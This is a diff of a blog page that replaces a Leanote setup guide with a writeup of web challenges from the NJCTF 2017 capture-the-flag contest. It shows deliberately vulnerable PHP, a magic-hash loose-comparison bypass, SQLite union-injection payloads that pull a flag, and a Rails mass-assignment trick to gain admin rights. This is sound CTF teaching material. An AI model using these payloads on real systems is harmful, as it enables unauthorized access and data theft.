@@ -5,53 +5,47 @@
   <meta http-equiv="X-UA-Compatible" content="chrome=1">
   
   <title>
-    Leanote環境搭建小记 | Virink&#39;s Blog 
+    NJCTF 2017 some web writeups | Virink&#39;s Blog 
   </title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
   <meta name="author" content="Virink">
 
 
-<meta name="description" content="Install Golang and revel
-下載安裝Golang
-cd /tmp
-//到官網下載
-tar -C /usr/local -xzf go*.tar.gz
+<meta name="description" content="Sqlite SQL Injection
+Source Code
+&amp;lt;?php
+require_once &amp;quot;db.php&amp;quot;;
+$auth = 0;
 
-設置環境變量
-cat &amp;gt;&amp;gt; ~/.profile &amp;lt;&amp;lt;EOF
-export GOROOT=/usr/local/go
-export GOPATH=$HOME/gocode
-export PATH=$PA">
+if (isset($_COOKIE[&amp;quot;auth&amp;quot;])) {
+    $auth = $_COOKIE[&amp;quot;auth&amp;quot;];
+    $hsh = $_COOKIE[&amp;quot;hsh&amp;qu">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Leanote環境搭建小记 | Virink's Blog">
-<meta property="og:url" content="https://www.virzz.com/2016/10/16/Leanote環境搭建小记.html">
+<meta property="og:title" content="NJCTF 2017 some web writeups | Virink's Blog">
+<meta property="og:url" content="https://www.virzz.com/2017/03/16/NJCTF 2017 some web writeups.html">
 <meta property="og:site_name" content="Virink's Blog">
-<meta property="og:description" content="Install Golang and revel
-下載安裝Golang
-cd /tmp
-//到官網下載
-tar -C /usr/local -xzf go*.tar.gz
+<meta property="og:description" content="Sqlite SQL Injection
+Source Code
+&amp;lt;?php
+require_once &amp;quot;db.php&amp;quot;;
+$auth = 0;
 
-設置環境變量
-cat &amp;gt;&amp;gt; ~/.profile &amp;lt;&amp;lt;EOF
-export GOROOT=/usr/local/go
-export GOPATH=$HOME/gocode
-export PATH=$PA">
-<meta property="og:updated_time" content="2016-12-11T16:05:14.000Z">
+if (isset($_COOKIE[&amp;quot;auth&amp;quot;])) {
+    $auth = $_COOKIE[&amp;quot;auth&amp;quot;];
+    $hsh = $_COOKIE[&amp;quot;hsh&amp;qu">
+<meta property="og:updated_time" content="2017-03-16T11:25:14.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Leanote環境搭建小记 | Virink's Blog">
-<meta name="twitter:description" content="Install Golang and revel
-下載安裝Golang
-cd /tmp
-//到官網下載
-tar -C /usr/local -xzf go*.tar.gz
+<meta name="twitter:title" content="NJCTF 2017 some web writeups | Virink's Blog">
+<meta name="twitter:description" content="Sqlite SQL Injection
+Source Code
+&amp;lt;?php
+require_once &amp;quot;db.php&amp;quot;;
+$auth = 0;
 
-設置環境變量
-cat &amp;gt;&amp;gt; ~/.profile &amp;lt;&amp;lt;EOF
-export GOROOT=/usr/local/go
-export GOPATH=$HOME/gocode
-export PATH=$PA">
+if (isset($_COOKIE[&amp;quot;auth&amp;quot;])) {
+    $auth = $_COOKIE[&amp;quot;auth&amp;quot;];
+    $hsh = $_COOKIE[&amp;quot;hsh&amp;qu">
 
   <!-- favicon icon files -->
 
@@ -163,16 +157,16 @@ export PATH=$PA">
       
 <article class="post-container post-container--single">
   <header class="post-header">
-    <h1 class="post-title">Leanote環境搭建小记</h1>
+    <h1 class="post-title">NJCTF 2017 some web writeups</h1>
     
     <div class="post-meta">
-      <time datetime="2016-10-16 12:29:04" class="post-meta__date date">2016-10-16 12:29:04</time> 
+      <time datetime="2017-03-16 02:24:32" class="post-meta__date date">2017-03-16 02:24:32</time> 
       <span class="post-meta__tags tags">
       
       
         &#8226; 标签:
         <font class="tags">
-        <a class="tags-link" href="/tags/go/">go</a>, <a class="tags-link" href="/tags/leanote/">leanote</a>
+        <a class="tags-link" href="/tags/ctf/">ctf</a>, <a class="tags-link" href="/tags/writeups/">writeups</a>
         </font>
       
       </span>
@@ -180,98 +174,103 @@ export PATH=$PA">
     
   </header>
   <section id="post-content" class="article-content post">
-  <h2>Install Golang and revel</h2>
-<h3>下載安裝Golang</h3>
-<pre><code>cd /tmp
-//到官網下載
-tar -C /usr/local -xzf go*.tar.gz
-</code></pre>
-<h3>設置環境變量</h3>
-<pre><code>cat &gt;&gt; ~/.profile &lt;&lt;EOF
-export GOROOT=/usr/local/go
-export GOPATH=$HOME/gocode
-export PATH=$PATH:$GOROOT/bin:$GOPATH/bin
-EOF
+  <h2>Sqlite SQL Injection</h2>
+<h3>Source Code</h3>
+<pre><code>&lt;?php
+require_once &quot;db.php&quot;;
+$auth = 0;
 
-source ~/.profile
+if (isset($_COOKIE[&quot;auth&quot;])) {
+    $auth = $_COOKIE[&quot;auth&quot;];
+    $hsh = $_COOKIE[&quot;hsh&quot;];
+    if ($auth == $hsh) {
+        $auth = 0;
+    } else {
+        if (sha1((string) $hsh) == md5((string) $auth)) {
+            $auth = 1;
+        } else {
+            $auth = 0;
+        }
+    }
+} else {
+    $auth = 0;
+    $s = $auth;
+    setcookie(&quot;auth&quot;, $s);
+    setcookie(&quot;hsh&quot;, sha1((string) $s));
+}
+if ($auth) {
+    if (isset($_GET['query'])) {
+        $db = new SQLite3($SQL_DATABASE, SQLITE3_OPEN_READONLY);
+        $qstr = SQLITE3::escapeString($_GET['query']);
+        $query = &quot;SELECT amount FROM my_wallets WHERE id={$qstr}&quot;;
+        $result = $db-&gt;querySingle($query);
+        if (!$result === NULL) {
+            echo &quot;Error - invalid query&quot;;
+        } else {
+            echo &quot;Wallet contains: {$result}&quot;;
+        }
+    } else {
+        echo &quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Admin Page&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Welcome to the admin panel!&lt;br /&gt;&lt;br /&gt;&lt;form name='input' action='admin.php' method='get'&gt;Wallet ID: &lt;input type='text' name='query'&gt;&lt;input type='submit' value='Submit Query'&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&quot;;
+    }
+} else {
+    echo &quot;Sorry, not authorized.&quot;;
+}
 </code></pre>
-<h3>Install revel &amp; leanote</h3>
-<pre><code>go get github.com/revel/cmd/revel
-go get github.com/leanote/leanote/app
+<h3>First</h3>
+<p>我們需要繞過</p>
+<pre><code>sha1((string) $hsh) == md5((string) $auth
 </code></pre>
-<h2>安裝Mongdo</h2>
-<pre><code>sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 7F0CEB10
-echo 'deb http://downloads-distro.mongodb.org/repo/ubuntu-upstart dist 10gen' | sudo tee /etc/apt/sources.list.d/mongodb.list
-sudo apt-get update
-sudo apt-get install -y mongodb-org
+<p>一個簡單的弱類型漏洞，只要md5和sha1密文為0exxx...即可</p>
+<pre><code>md5(&quot;QNKCDZO&quot;) == sha1(&quot;aaK1STfY&quot;)
 </code></pre>
-<h3>設置環境變量(可有可無)</h3>
-<pre><code>cat &gt;&gt; ~/.profile &lt;&lt;EOF
-export MONGOPATH=/usr/bin
-export PATH=$PATH:$MONGOPATH
-EOF
-
-source ~/.profile
+<p>平時注意收集</p>
+<h3>Next</h3>
+<pre><code>$query = &quot;SELECT amount FROM my_wallets WHERE id={$qstr}&quot;;
 </code></pre>
-<h3>新建一个目录data存放mongodb数据:</h3>
-<pre><code>mkdir /path/data
+<p>有<strong>SQLITE3::escapeString</strong>過濾但無單引號的數值型注入</p>
+<h4>從數據庫找到所有表</h4>
+<pre><code>-1 union select table_name from sqlite_master limit 1,1
 </code></pre>
-<h3>用以下命令启动mongod:</h3>
-<pre><code>mongod --dbpath /path/data
+<h4>發現flag表，查詢flag表的字段</h4>
+<pre><code>-1 union select sql from sqlite_master limit 1,1
 </code></pre>
-<p>这时mongod已经启动，重新打开一个终端, 键入mongo进入交互程序：</p>
-<pre><code>$&gt; mongo
-&gt; show dbs
-...数据库列表
+<h4>發現id類型為varchar(255),flag很有藏在其中</h4>
+<pre><code>-1 union select id from flag limit 1,1
 </code></pre>
-<p>mongodb安装到此为止</p>
-<h2>安裝Leanote</h2>
-<p><strong>请务必修改app.secret一项, 在若干个随机位置处，将字符修改成一个其他的值, 否则会有安全隐患!</strong></p>
-<h3>修改配置</h3>
-<pre><code>$GOPATH/src/github.com/leanote/leanote/conf/app.conf
+<h3>Finally</h3>
+<p><strong>Payload</strong></p>
+<pre><code>query=-1%20union%20select%20id%20from%20flag%20limit%201,1
 </code></pre>
-<h3>導入初始數據</h3>
-<pre><code>mongorestore -h localhost -d leanote --directoryperdb ~/gocode/src/github.com/leanote/leanote/mongodb_backup/leanote_install_data
+<p>Get it!</p>
+<h2>Ruby on Rails</h2>
+<p>也是源碼審計，然而是我不會的rb，即使如此我也是硬著頭皮往下看</p>
+<p>大致瀏覽文件，在<code>config/routes.rb</code>中可以看到一些路由的定義</p>
+<p>結合部署好的web網頁，不難找到其中的邏輯。</p>
+<p>註冊了個賬號，各種操作，發現只有Profile以及Micropost可以寫入數據</p>
+<p>然後發現<code>./app/views/users/_user.html.erb</code>中又**<!--flag is here-->**</p>
+<p>結合下一句**&lt;% if current_user.admin? &amp;&amp; !current_user?(user) %&gt;**</p>
+<p>可以判斷很有可能是越權，此處應該有flag</p>
+<p>然後在<code>./app/controllers/users_controller.rb</code>可以看到</p>
+<pre><code>params.require(:user).permit(:name, :email, :password, :password_confirmation, :admin)
 </code></pre>
-<h3>运行leanote</h3>
-<p><strong>注意: 在此之前请确保mongodb已在运行!</strong></p>
-<p>新开一个窗口, 运行:</p>
-<pre><code>$&gt; revel run github.com/leanote/leanote
-</code></pre>
-<p>恭喜你, 打开浏览器输入: http://localhost:9000 体验leanote吧!</p>
-<h2>啟動管理</h2>
-<pre><code>apt-get install supervisor
-</code></pre>
-<h3>創建配置文件</h3>
-<p>/etc/supervisor/conf.d/<strong>{filename}</strong>.conf</p>
-<p><strong>mongodb.conf</strong></p>
-<pre><code>[program:mongodb]
-command=/usr/bin/mongod --dbpath /path/data
-autorestart=true
-user=root
-</code></pre>
-<p><strong>leanote.conf</strong></p>
-<pre><code>[program:leanote]
-command=revel run github.com/leanote/leanote
-user=root
-autorestart=true
-</code></pre>
-<h3>運行</h3>
-<pre><code>supervisord -c /etc/supervisor/supervisor.conf
-</code></pre>
+<p>而<code>./app/views/users/edit.html.erb</code>中沒有admin表單輸入</p>
+<p>很明顯提交<code>user[admin]=1</code>即可成為管理員</p>
+<p>然後再某個頁面就能看到一大波的flag~~</p>
+<h2>The end</h2>
+<p>隨便看看，隨便做做也就這樣了</p>
 
   </section>
   <div class="copyright">
-    <span>文本標題:</span><a href="/2016/10/16/Leanote環境搭建小记.html" target="_blank">Leanote環境搭建小记</a><br />
+    <span>文本標題:</span><a href="/2017/03/16/NJCTF 2017 some web writeups.html" target="_blank">NJCTF 2017 some web writeups</a><br />
     <span>文章作者:</span><a href="/" title="回到主页" target="_blank">Virink</a><br />
-    <span>發佈時間:</span>2016-10-16 12:29:04<br />
-    <span>最後更新:</span>2016-12-12 00:05:14<br />
-    <span>原始鏈接:</span><a class="post-url" href="https://www.virzz.com/2016/10/16/Leanote環境搭建小记.html" title="Leanote環境搭建小记" target="_blank">https://www.virzz.com/2016/10/16/Leanote環境搭建小记.html</a><br />
+    <span>發佈時間:</span>2017-03-16 02:24:32<br />
+    <span>最後更新:</span>2017-03-16 19:25:14<br />
+    <span>原始鏈接:</span><a class="post-url" href="https://www.virzz.com/2017/03/16/NJCTF 2017 some web writeups.html" title="NJCTF 2017 some web writeups" target="_blank">https://www.virzz.com/2017/03/16/NJCTF 2017 some web writeups.html</a><br />
     <span>轉載聲明:</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。
   </div>
   
 <section class="post-comments">
-    <div class="ds-thread" data-thread-key="2016/10/16/Leanote環境搭建小记.html" data-title="Leanote環境搭建小记" data-url="https://www.virzz.com/2016/10/16/Leanote環境搭建小记.html"></div>
+    <div class="ds-thread" data-thread-key="2017/03/16/NJCTF 2017 some web writeups.html" data-title="NJCTF 2017 some web writeups" data-url="https://www.virzz.com/2017/03/16/NJCTF 2017 some web writeups.html"></div>
     <script type="text/javascript">
     var duoshuoQuery = {short_name:"virink"};
       (function() {
